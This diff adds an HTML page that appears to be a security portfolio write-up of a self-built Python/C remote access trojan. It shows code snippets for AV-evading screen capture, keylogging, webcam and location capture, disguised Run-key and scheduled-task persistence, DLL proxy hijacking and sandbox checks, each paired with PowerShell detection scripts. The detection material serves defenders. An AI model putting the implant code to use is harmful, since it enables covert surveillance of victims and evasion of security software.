@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Einayim Implant Analysis | 22nd Survey Division</title>
+    <meta name="description" content="Technical breakdown of a Python/C RAT: VNC bypass, keylogging, webcam capture, geolocation, persistence mechanisms, and blue team detection methods.">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0a;
+            --bg2: rgba(18, 18, 18, 0.95);
+            --text: #ffffff;
+            --dim: #888888;
+            --border: rgba(255, 255, 255, 0.12);
+            --red: #ff6b6b;
+            --blue: #4dabf7;
+        }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 2rem 1rem; }
+        }
+        .back-link {
+            display: inline-block;
+            color: var(--dim);
+            font-size: 0.75rem;
+            margin-bottom: 2rem;
+            text-decoration: none;
+        }
+        .back-link:hover { color: var(--text); }
+        .tag {
+            display: inline-block;
+            font-size: 0.65rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+        }
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 400;
+            margin-bottom: 1rem;
+        }
+        .meta {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+        h2 {
+            font-size: 1rem;
+            font-weight: 500;
+            margin: 2.5rem 0 1rem;
+            color: var(--text);
+        }
+        h3 {
+            font-size: 0.9rem;
+            font-weight: 500;
+            margin: 1.5rem 0 0.75rem;
+            color: var(--text);
+        }
+        p {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+        }
+        ul, ol {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+            padding-left: 1.5rem;
+        }
+        li { margin-bottom: 0.5rem; }
+        code {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 0.15rem 0.4rem;
+            font-size: 0.8rem;
+            border-radius: 2px;
+        }
+        .highlight {
+            color: var(--text);
+            font-weight: 500;
+        }
+        .code-block {
+            background: #0d1117;
+            border: 1px solid rgba(255,255,255,0.08);
+            padding: 1rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+            font-size: 0.78rem;
+            line-height: 1.6;
+        }
+        .code-block pre {
+            margin: 0;
+            color: #c9d1d9;
+        }
+        .comment { color: #8b949e; }
+        .keyword { color: #ff7b72; }
+        .string { color: #a5d6ff; }
+        .function { color: #d2a8ff; }
+        .number { color: #79c0ff; }
+
+        .layman-box {
+            background: rgba(255,255,255,0.03);
+            border-left: 3px solid rgba(255,255,255,0.2);
+            padding: 1rem 1.25rem;
+            margin: 1.5rem 0;
+        }
+        .layman-label {
+            font-size: 0.6rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.4rem;
+        }
+        .layman-tldr {
+            font-size: 0.85rem;
+            color: var(--text);
+            font-weight: 500;
+            margin-bottom: 0.4rem;
+        }
+        .layman-box p {
+            font-size: 0.82rem;
+            color: var(--dim);
+            margin: 0;
+        }
+
+        .detect-widget {
+            background: #0d1117;
+            border: 1px solid rgba(255,255,255,0.08);
+            margin: 1.5rem 0;
+            overflow: hidden;
+        }
+        .dw-header {
+            background: rgba(255,255,255,0.04);
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            padding: 0.4rem 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .dw-dots { display: flex; gap: 4px; flex-shrink: 0; }
+        .dw-dot { width: 7px; height: 7px; border-radius: 50%; }
+        .dw-dot.r { background: #ff5f56; }
+        .dw-dot.y { background: #ffbd2e; }
+        .dw-dot.g { background: #27c93f; }
+        .dw-title {
+            font-size: 0.6rem;
+            color: #6a737d;
+            flex: 1;
+            margin-left: 4px;
+        }
+        .dw-btref {
+            font-size: 0.6rem;
+            color: var(--dim);
+            text-decoration: none;
+            padding: 0.15rem 0.5rem;
+            border: 1px solid var(--border);
+            white-space: nowrap;
+        }
+        .dw-btref:hover {
+            color: var(--text);
+            border-color: rgba(255,255,255,0.3);
+        }
+        .detect-widget pre {
+            font-size: 0.72rem;
+            line-height: 1.6;
+            padding: 0.75rem 1rem;
+            margin: 0;
+            color: #c9d1d9;
+            overflow-x: auto;
+        }
+        .dw-flag {
+            border-top: 1px solid rgba(255,255,255,0.06);
+            padding: 0.5rem 1rem;
+            font-size: 0.65rem;
+            color: var(--dim);
+        }
+        .dw-flag strong { color: var(--text); }
+
+        .warning-box {
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 3px solid var(--red);
+            padding: 1rem 1.25rem;
+            margin: 1.5rem 0;
+        }
+        .warning-box h4 {
+            font-size: 0.75rem;
+            color: var(--red);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .warning-box p {
+            font-size: 0.82rem;
+            margin: 0;
+        }
+
+        .capability-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.78rem;
+            margin: 1.5rem 0;
+        }
+        .capability-table th {
+            text-align: left;
+            color: var(--text);
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid var(--border);
+            font-weight: 500;
+        }
+        .capability-table td {
+            color: var(--dim);
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            vertical-align: top;
+        }
+        .capability-table tr:hover td {
+            background: rgba(255,255,255,0.02);
+        }
+
+        .video-section {
+            margin: 2rem 0;
+            border: 1px solid var(--border);
+            overflow: hidden;
+        }
+        .video-section iframe {
+            width: 100%;
+            aspect-ratio: 16/9;
+            border: none;
+            display: block;
+            background: #000;
+        }
+        .video-caption {
+            font-size: 0.72rem;
+            color: var(--dim);
+            padding: 0.6rem 1rem;
+            border-top: 1px solid var(--border);
+            margin: 0;
+        }
+
+        .mitre {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid var(--border);
+        }
+        .mitre a {
+            color: var(--blue);
+            text-decoration: none;
+        }
+        .mitre a:hover {
+            text-decoration: underline;
+        }
+
+        /* Copy button */
+        .code-block, .detect-widget {
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.15);
+            color: var(--dim);
+            font-size: 0.6rem;
+            padding: 0.25rem 0.5rem;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s ease;
+            z-index: 10;
+        }
+        .copy-btn:hover {
+            background: rgba(255,255,255,0.15);
+            color: var(--text);
+        }
+        .copy-btn.copied {
+            background: rgba(39, 201, 63, 0.2);
+            border-color: rgba(39, 201, 63, 0.4);
+            color: #27c93f;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/portfolio.html#writeups" class="back-link">&larr; Back to writeups</a>
+
+        <span class="tag">Command &amp; Control</span>
+        <h1>Einayim Implant Analysis</h1>
+        <p class="meta">Full-featured RAT: VNC bypass, keylogging, webcam, geolocation, persistence — and how to detect it</p>
+
+        <div class="layman-box">
+            <div class="layman-label">// What is this?</div>
+            <div class="layman-tldr">A Python/C implant built to evade Kaspersky while providing remote desktop, keylogging, webcam, and file access.</div>
+            <p>This writeup documents a research implant I built to understand how commodity RATs work — and more importantly, how to detect them. Every capability shown here has corresponding blue team detection methods. The goal is understanding, not replication.</p>
+        </div>
+
+        <div class="warning-box">
+            <h4>Research Context</h4>
+            <p>This implant was built for authorized security research in isolated lab environments. The techniques documented here are common in commodity malware. Understanding them is essential for detection engineering.</p>
+        </div>
+
+        <h2>Video Demonstration</h2>
+
+        <div class="video-section">
+            <iframe
+                src="https://www.youtube.com/embed/6_HBnII0H_8"
+                title="Einayim VNC Demo"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+            </iframe>
+            <p class="video-caption">Live VNC session demonstrating screen capture, remote control, and C2 communication. Lab environment on authorized infrastructure.</p>
+        </div>
+
+        <h2>Capability Overview</h2>
+
+        <table class="capability-table">
+            <tr>
+                <th>Capability</th>
+                <th>Implementation</th>
+                <th>MITRE ATT&amp;CK</th>
+            </tr>
+            <tr>
+                <td>Screen Capture</td>
+                <td>Win32 BitBlt (bypasses mss module detection)</td>
+                <td>T1113</td>
+            </tr>
+            <tr>
+                <td>Remote Desktop</td>
+                <td>pynput mouse/keyboard control</td>
+                <td>T1021.005</td>
+            </tr>
+            <tr>
+                <td>Keylogging</td>
+                <td>pynput KeyListener hook</td>
+                <td>T1056.001</td>
+            </tr>
+            <tr>
+                <td>Webcam</td>
+                <td>OpenCV (cv2) VideoCapture</td>
+                <td>T1125</td>
+            </tr>
+            <tr>
+                <td>Audio</td>
+                <td>pyaudio stream capture</td>
+                <td>T1123</td>
+            </tr>
+            <tr>
+                <td>File Browser</td>
+                <td>os.listdir + file upload/download</td>
+                <td>T1083, T1041</td>
+            </tr>
+            <tr>
+                <td>Geolocation</td>
+                <td>Windows Location API via PowerShell</td>
+                <td>T1614.001</td>
+            </tr>
+            <tr>
+                <td>Clipboard</td>
+                <td>pyperclip get/set</td>
+                <td>T1115</td>
+            </tr>
+            <tr>
+                <td>Persistence</td>
+                <td>Registry Run + Scheduled Tasks</td>
+                <td>T1547.001, T1053.005</td>
+            </tr>
+            <tr>
+                <td>C2</td>
+                <td>WebSocket JSON over TCP 8080</td>
+                <td>T1071.001</td>
+            </tr>
+        </table>
+
+        <h2>Screen Capture: Bypassing Kaspersky</h2>
+
+        <p>Most Python screen capture uses the <code>mss</code> module. Kaspersky flags <code>mss</code> imports as suspicious because it's common in commodity RATs. The bypass: use raw Win32 BitBlt instead.</p>
+
+        <div class="code-block">
+<pre><span class="comment"># Win32 BitBlt screen capture - avoids mss module detection</span>
+<span class="keyword">def</span> <span class="function">capture_screen_win32</span>():
+    user32 = windll.user32
+    gdi32 = windll.gdi32
+
+    <span class="comment"># Get screen dimensions</span>
+    width = user32.GetSystemMetrics(<span class="number">0</span>)
+    height = user32.GetSystemMetrics(<span class="number">1</span>)
+
+    <span class="comment"># Get desktop DC</span>
+    hwnd = user32.GetDesktopWindow()
+    hdc_src = user32.GetWindowDC(hwnd)
+    hdc_dst = gdi32.CreateCompatibleDC(hdc_src)
+
+    <span class="comment"># Create bitmap and BitBlt copy</span>
+    hbmp = gdi32.CreateCompatibleBitmap(hdc_src, width, height)
+    gdi32.SelectObject(hdc_dst, hbmp)
+    gdi32.BitBlt(hdc_dst, <span class="number">0</span>, <span class="number">0</span>, width, height, hdc_src, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00CC0020</span>)  <span class="comment"># SRCCOPY</span>
+
+    <span class="comment"># Get raw bitmap bits, convert to image</span>
+    <span class="comment"># [buffer handling code - see detection section]</span>
+
+    <span class="comment"># Cleanup handles</span>
+    gdi32.DeleteObject(hbmp)
+    gdi32.DeleteDC(hdc_dst)
+    user32.ReleaseDC(hwnd, hdc_src)</pre>
+        </div>
+
+        <p>The technique uses standard GDI functions that thousands of legitimate applications call. No suspicious module imports, no behavioral signatures from <code>mss</code>.</p>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — Screen Capture Detection</span>
+                <a href="/blueteam-ref.html#monitoring" class="dw-btref">&rarr; Blue Team Ref</a>
+            </div>
+            <pre># Detect processes calling GetDesktopWindow + BitBlt frequently
+# Sysmon Event ID 10 (ProcessAccess) won't catch this
+# Need ETW tracing on GDI32 or behavioral analysis:
+
+# Check for Python processes with GDI handles
+Get-Process python*, pythonw* -ErrorAction SilentlyContinue | ForEach-Object {
+    $handles = (Get-Process -Id $_.Id).HandleCount
+    if ($handles -gt 500) {
+        Write-Warning "High handle count: $($_.Name) PID $($_.Id) - $handles handles"
+    }
+}
+
+# Look for recent screen capture artifacts
+Get-ChildItem "$env:TEMP" -Recurse -Include "*.jpg","*.png","*.bmp" -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-30) -and $_.Length -gt 100KB }</pre>
+            <div class="dw-flag"><strong>Detection notes:</strong> BitBlt screen capture is hard to detect via API monitoring because it uses legitimate GDI functions. Focus on behavioral indicators: high frame rate capture, unusual process accessing desktop DC, image files appearing in temp directories.</div>
+        </div>
+
+        <h2>Keylogging: pynput Hook</h2>
+
+        <p>Keylogging uses <code>pynput.keyboard.Listener</code> which installs a low-level keyboard hook via <code>SetWindowsHookEx</code>. The hook captures all keystrokes system-wide.</p>
+
+        <div class="code-block">
+<pre><span class="keyword">from</span> pynput.keyboard <span class="keyword">import</span> Listener <span class="keyword">as</span> KeyListener
+
+keylog_buffer = <span class="string">""</span>
+
+<span class="keyword">def</span> <span class="function">on_key_press</span>(key):
+    <span class="keyword">global</span> keylog_buffer
+    <span class="keyword">try</span>:
+        keylog_buffer += key.char
+    <span class="keyword">except</span> AttributeError:
+        <span class="comment"># Special keys</span>
+        keylog_buffer += f<span class="string">"[{key.name}]"</span>
+
+<span class="comment"># Start listener in background thread</span>
+listener = KeyListener(on_press=on_key_press)
+listener.start()</pre>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — Keylogger Detection</span>
+                <a href="/blueteam-ref.html#keylogger" class="dw-btref">&rarr; Blue Team Ref</a>
+            </div>
+            <pre># Detect low-level keyboard hooks (SetWindowsHookEx)
+# Requires administrative privileges
+
+# Method 1: Check for suspicious Python processes with keyboard hooks
+Get-WmiObject Win32_Process -Filter "Name LIKE 'python%'" | ForEach-Object {
+    $cmdline = $_.CommandLine
+    if ($cmdline -match "pynput|keyboard|hook") {
+        Write-Warning "Suspicious Python process: PID $($_.ProcessId) - $cmdline"
+    }
+}
+
+# Method 2: Sysmon Event ID 1 - look for pynput in command lines
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} -MaxEvents 1000 |
+    Where-Object { $_.Message -match 'pynput|keyboard.*listener' }
+
+# Method 3: Check loaded DLLs for hook indicators
+Get-Process python* -ErrorAction SilentlyContinue | ForEach-Object {
+    $modules = $_.Modules | Select-Object -ExpandProperty ModuleName
+    if ($modules -contains "user32.dll") {
+        Write-Output "PID $($_.Id) has user32.dll loaded (potential hook)"
+    }
+}</pre>
+            <div class="dw-flag"><strong>If this flags:</strong> pynput keyloggers call SetWindowsHookEx with WH_KEYBOARD_LL. This is visible in ETW traces and some EDR telemetry. Legitimate uses exist (accessibility software), so correlate with other indicators.</div>
+        </div>
+
+        <h2>Webcam Capture: OpenCV</h2>
+
+        <p>Webcam access uses OpenCV's VideoCapture. Simple, effective, and appears in many legitimate applications.</p>
+
+        <div class="code-block">
+<pre><span class="keyword">import</span> cv2
+
+<span class="keyword">def</span> <span class="function">capture_webcam_frame</span>():
+    cap = cv2.VideoCapture(<span class="number">0</span>)  <span class="comment"># Default webcam</span>
+    <span class="keyword">if</span> cap.isOpened():
+        ret, frame = cap.read()
+        cap.release()
+        <span class="keyword">if</span> ret:
+            <span class="comment"># Encode to JPEG, base64 for transmission</span>
+            _, buffer = cv2.imencode(<span class="string">'.jpg'</span>, frame)
+            <span class="keyword">return</span> base64.b64encode(buffer).decode()
+    <span class="keyword">return</span> <span class="keyword">None</span></pre>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — Webcam Access Detection</span>
+                <a href="/blueteam-ref.html#privacy" class="dw-btref">&rarr; Blue Team Ref</a>
+            </div>
+            <pre># Check which processes have accessed webcam recently
+# Windows 10/11 tracks camera access in registry
+
+$camPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam"
+Get-ChildItem $camPath -ErrorAction SilentlyContinue | ForEach-Object {
+    $lastUsed = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).LastUsedTimeStop
+    if ($lastUsed) {
+        $app = Split-Path $_.Name -Leaf
+        $time = [DateTime]::FromFileTime($lastUsed)
+        Write-Output "$app - Last accessed: $time"
+    }
+}
+
+# Check for Python processes with camera handles
+Get-Process python* -ErrorAction SilentlyContinue | ForEach-Object {
+    $handles = $_.HandleCount
+    Write-Output "Python PID $($_.Id): $handles handles"
+}</pre>
+            <div class="dw-flag"><strong>Detection notes:</strong> Windows 10+ shows camera indicator light and logs access. Check CapabilityAccessManager registry for unauthorized camera access. cv2.VideoCapture also loads avicap32.dll which can be monitored.</div>
+        </div>
+
+        <h2>Geolocation: Windows Location API</h2>
+
+        <p>The implant uses PowerShell to access Windows Location Services. This requires location permissions but many users have it enabled.</p>
+
+        <div class="code-block">
+<pre><span class="comment"># PowerShell snippet executed by implant</span>
+GPS_SCRIPT = <span class="string">"""
+Add-Type -AssemblyName System.Device
+$watcher = New-Object System.Device.Location.GeoCoordinateWatcher('High')
+$watcher.Start()
+
+# Wait for location fix (max 30 seconds)
+$timeout = 0
+while ($watcher.Status -ne 'Ready' -and $timeout -lt 30) {
+    Start-Sleep -Seconds 1
+    $timeout++
+}
+
+if ($watcher.Status -eq 'Ready') {
+    $coord = $watcher.Position.Location
+    $lat = $coord.Latitude.ToString([System.Globalization.CultureInfo]::InvariantCulture)
+    $lng = $coord.Longitude.ToString([System.Globalization.CultureInfo]::InvariantCulture)
+    Write-Output "$lat,$lng"
+}
+$watcher.Stop()
+"""</span></pre>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — Location Access Detection</span>
+                <a href="/blueteam-ref.html#privacy" class="dw-btref">&rarr; Blue Team Ref</a>
+            </div>
+            <pre># Check location service access
+$locPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"
+Get-ChildItem $locPath -ErrorAction SilentlyContinue | ForEach-Object {
+    $lastUsed = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).LastUsedTimeStop
+    if ($lastUsed) {
+        $app = Split-Path $_.Name -Leaf
+        $time = [DateTime]::FromFileTime($lastUsed)
+        Write-Output "Location access: $app at $time"
+    }
+}
+
+# Monitor for GeoCoordinateWatcher in PowerShell
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 500 |
+    Where-Object { $_.Message -match 'GeoCoordinateWatcher|System\.Device\.Location' } |
+    Select-Object TimeCreated, Message</pre>
+            <div class="dw-flag"><strong>If this flags:</strong> Location API access from PowerShell or unknown processes is suspicious. Legitimate apps request location via UWP APIs with user consent dialogs, not via direct .NET calls from scripts.</div>
+        </div>
+
+        <h2>Persistence Mechanisms</h2>
+
+        <h3>Registry Run Key</h3>
+        <p>Classic persistence via <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>. Survives reboots, runs at user login.</p>
+
+        <div class="code-block">
+<pre><span class="keyword">import</span> winreg
+
+<span class="keyword">def</span> <span class="function">install_persistence_registry</span>():
+    exe_path = sys.executable <span class="keyword">if</span> getattr(sys, <span class="string">'frozen'</span>, <span class="keyword">False</span>) <span class="keyword">else</span> __file__
+
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        <span class="string">r"Software\Microsoft\Windows\CurrentVersion\Run"</span>,
+        <span class="number">0</span>,
+        winreg.KEY_SET_VALUE
+    )
+    winreg.SetValueEx(key, <span class="string">"WindowsUpdateService"</span>, <span class="number">0</span>, winreg.REG_SZ, exe_path)
+    winreg.CloseKey(key)</pre>
+        </div>
+
+        <h3>Scheduled Task</h3>
+        <p>Creates a scheduled task that runs at logon with highest privileges.</p>
+
+        <div class="code-block">
+<pre><span class="keyword">def</span> <span class="function">install_persistence_task</span>():
+    exe_path = sys.executable <span class="keyword">if</span> getattr(sys, <span class="string">'frozen'</span>, <span class="keyword">False</span>) <span class="keyword">else</span> __file__
+    cmd = f<span class="string">'schtasks /create /tn "WindowsUpdateService" /tr "{exe_path}" /sc onlogon /rl highest /f'</span>
+    subprocess.run(cmd, shell=<span class="keyword">True</span>, capture_output=<span class="keyword">True</span>)</pre>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — Persistence Detection</span>
+                <a href="/blueteam-ref.html#persistence" class="dw-btref">&rarr; Blue Team Ref</a>
+            </div>
+            <pre># Check Run keys for suspicious entries
+$runKeys = @(
+    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+)
+
+foreach ($key in $runKeys) {
+    Get-ItemProperty $key -ErrorAction SilentlyContinue | ForEach-Object {
+        $_.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
+            $val = $_.Value
+            # Flag Python executables, temp paths, or suspicious names
+            if ($val -match 'python|\.py|\\Temp\\|AppData\\Local\\Temp') {
+                Write-Warning "Suspicious Run entry: $($_.Name) = $val"
+            }
+        }
+    }
+}
+
+# Check scheduled tasks
+Get-ScheduledTask | Where-Object {
+    $_.Actions.Execute -match 'python|\.py|powershell.*-enc' -or
+    $_.TaskName -match 'Update|Service|Windows' -and $_.Author -notmatch 'Microsoft'
+} | Select-Object TaskName, @{N='Command';E={$_.Actions.Execute}}</pre>
+            <div class="dw-flag"><strong>If this flags:</strong> Entries pointing to Python scripts, temp directories, or with generic Windows-mimicking names (WindowsUpdateService, SystemHealth) are red flags. Cross-reference with known good baselines.</div>
+        </div>
+
+        <h2>C Implementation: DLL Proxy Hijacking</h2>
+
+        <p>The C version uses DLL proxy hijacking via <code>version.dll</code>. The malicious DLL forwards all legitimate calls to the real version.dll while running implant code.</p>
+
+        <div class="code-block">
+<pre><span class="comment">/* Export forwarding - proxy to real version.dll */</span>
+<span class="keyword">#pragma</span> comment(linker, <span class="string">"/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA"</span>)
+<span class="keyword">#pragma</span> comment(linker, <span class="string">"/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW"</span>)
+<span class="keyword">#pragma</span> comment(linker, <span class="string">"/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA"</span>)
+<span class="keyword">#pragma</span> comment(linker, <span class="string">"/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW"</span>)
+<span class="keyword">#pragma</span> comment(linker, <span class="string">"/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA"</span>)
+<span class="keyword">#pragma</span> comment(linker, <span class="string">"/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW"</span>)
+
+<span class="comment">/* DllMain - implant initialization */</span>
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) {
+        <span class="comment">/* Start implant thread */</span>
+        CreateThread(NULL, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)implant_main, NULL, <span class="number">0</span>, NULL);
+    }
+    <span class="keyword">return</span> TRUE;
+}</pre>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — DLL Hijack Detection</span>
+                <a href="/blueteam-ref.html#hijack" class="dw-btref">&rarr; Blue Team Ref</a>
+            </div>
+            <pre># Check for version.dll in application directories (should only be in System32)
+$legitPath = "$env:SystemRoot\System32\version.dll"
+
+Get-ChildItem "C:\Program Files","C:\Program Files (x86)",$env:APPDATA -Recurse -Filter "version.dll" -ErrorAction SilentlyContinue |
+    ForEach-Object {
+        $sig = Get-AuthenticodeSignature $_.FullName
+        Write-Warning "version.dll found: $($_.FullPath)"
+        Write-Warning "  Signed: $($sig.Status) by $($sig.SignerCertificate.Subject)"
+    }
+
+# Check DLL search order abuse - application dirs before System32
+Get-Process | ForEach-Object {
+    $path = $_.Path
+    if ($path -and (Test-Path (Join-Path (Split-Path $path) "version.dll"))) {
+        Write-Warning "$($_.Name) may load hijacked version.dll from $(Split-Path $path)"
+    }
+}</pre>
+            <div class="dw-flag"><strong>Detection notes:</strong> version.dll should only exist in System32. Any copy elsewhere is suspicious. Check Authenticode signature - legitimate Microsoft DLLs are signed.</div>
+        </div>
+
+        <h2>Sandbox Detection</h2>
+
+        <p>The C version includes anti-analysis checks to detect virtual machines and sandboxes:</p>
+
+        <div class="code-block">
+<pre>BOOL IsSandboxEnvironment() {
+    <span class="comment">// Check for debugger</span>
+    <span class="keyword">if</span> (IsDebuggerPresent()) <span class="keyword">return</span> TRUE;
+
+    <span class="comment">// Check PEB BeingDebugged flag</span>
+    BOOL debugged = FALSE;
+    __asm {
+        mov eax, fs:[<span class="number">0x30</span>]
+        mov al, [eax + <span class="number">0x2</span>]
+        mov debugged, al
+    }
+    <span class="keyword">if</span> (debugged) <span class="keyword">return</span> TRUE;
+
+    <span class="comment">// Check for sandbox processes</span>
+    <span class="keyword">const char</span>* sandboxProcesses[] = {
+        <span class="string">"vmtoolsd.exe"</span>,      <span class="comment">// VMware</span>
+        <span class="string">"VBoxService.exe"</span>,   <span class="comment">// VirtualBox</span>
+        <span class="string">"xenservice.exe"</span>,    <span class="comment">// Xen</span>
+        <span class="string">"qemu-ga.exe"</span>,       <span class="comment">// QEMU</span>
+        <span class="string">"sbiesvc.exe"</span>,       <span class="comment">// Sandboxie</span>
+        <span class="string">"CuckooService.exe"</span>  <span class="comment">// Cuckoo sandbox</span>
+    };
+    <span class="comment">// ... process enumeration check ...</span>
+}</pre>
+        </div>
+
+        <p>These checks are well-known to malware analysts. Modern sandboxes hide these artifacts, but commodity malware still uses them.</p>
+
+        <h2>Summary: Detection Strategy</h2>
+
+        <p>Detecting this implant requires layered monitoring:</p>
+
+        <ol>
+            <li><strong>Process monitoring:</strong> Python processes with high handle counts, unusual network connections</li>
+            <li><strong>Registry monitoring:</strong> New Run key entries, especially pointing to scripts or temp paths</li>
+            <li><strong>Scheduled tasks:</strong> New tasks with generic Windows names, running from user directories</li>
+            <li><strong>DLL integrity:</strong> version.dll (and other commonly hijacked DLLs) outside System32</li>
+            <li><strong>Privacy access:</strong> Camera/location access from unexpected processes</li>
+            <li><strong>Network:</strong> WebSocket connections on unusual ports, persistent beaconing</li>
+        </ol>
+
+        <p>No single indicator is definitive. Correlation across multiple data sources provides the clearest picture.</p>
+
+        <div class="mitre">
+            <strong>MITRE ATT&amp;CK References:</strong><br>
+            <a href="https://attack.mitre.org/techniques/T1113/" target="_blank">T1113 - Screen Capture</a> ·
+            <a href="https://attack.mitre.org/techniques/T1056/001/" target="_blank">T1056.001 - Keylogging</a> ·
+            <a href="https://attack.mitre.org/techniques/T1125/" target="_blank">T1125 - Video Capture</a> ·
+            <a href="https://attack.mitre.org/techniques/T1123/" target="_blank">T1123 - Audio Capture</a> ·
+            <a href="https://attack.mitre.org/techniques/T1614/001/" target="_blank">T1614.001 - System Location Discovery</a> ·
+            <a href="https://attack.mitre.org/techniques/T1547/001/" target="_blank">T1547.001 - Registry Run Keys</a> ·
+            <a href="https://attack.mitre.org/techniques/T1053/005/" target="_blank">T1053.005 - Scheduled Task</a> ·
+            <a href="https://attack.mitre.org/techniques/T1574/001/" target="_blank">T1574.001 - DLL Search Order Hijacking</a>
+        </div>
+    </div>
+
+    <script>
+    // Add copy buttons to all code blocks and detect widgets
+    document.querySelectorAll('.code-block, .detect-widget').forEach(block => {
+        const btn = document.createElement('button');
+        btn.className = 'copy-btn';
+        btn.textContent = 'Copy';
+        btn.onclick = function() {
+            const pre = block.querySelector('pre');
+            if (pre) {
+                navigator.clipboard.writeText(pre.textContent).then(() => {
+                    btn.textContent = 'Copied!';
+                    btn.classList.add('copied');
+                    setTimeout(() => {
+                        btn.textContent = 'Copy';
+                        btn.classList.remove('copied');
+                    }, 2000);
+                });
+            }
+        };
+        block.appendChild(btn);
+    });
+    </script>
+    <!-- ElevenLabs Voice Widget -->
+    <elevenlabs-convai agent-id="agent_1901m3ndae6tecqa74rbmz86n7j3"></elevenlabs-convai>
+    <script src="https://unpkg.com/@elevenlabs/convai-widget-embed" async type="text/javascript"></script>
+</body>
+</html>
